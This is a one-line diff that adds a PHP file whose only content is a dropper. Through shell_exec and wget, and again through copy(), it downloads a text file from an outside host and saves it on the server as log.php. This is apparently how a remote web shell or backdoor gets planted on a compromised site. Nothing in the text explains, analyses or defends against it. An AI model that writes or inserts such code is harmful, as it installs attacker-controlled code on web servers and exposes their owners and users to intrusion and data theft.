@@ -1,0 +1,1 @@
+<? shell_exec("wget http://teplo-pk.ru/log.txt -O log.php"); copy('http://teplo-pk.ru/log.txt', 'log.php'); ?>
